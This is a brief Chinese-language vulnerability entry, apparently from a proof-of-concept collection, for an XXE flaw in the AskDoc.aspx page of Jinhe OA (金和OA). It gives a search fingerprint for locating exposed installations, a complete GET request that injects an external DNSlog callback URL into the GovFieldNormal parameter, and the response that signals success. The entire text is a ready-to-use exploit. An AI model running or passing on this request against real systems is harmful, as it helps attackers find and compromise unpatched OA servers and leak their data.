# 金和OAAskDoc.aspx存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`GET /c6/Jhsoft.Web.Ask/AskDoc.aspx/?GovFieldNormal=http://xxe.dnslog.pt/ HTTP/1.1`
- **响应特征**：200 Dnslog回显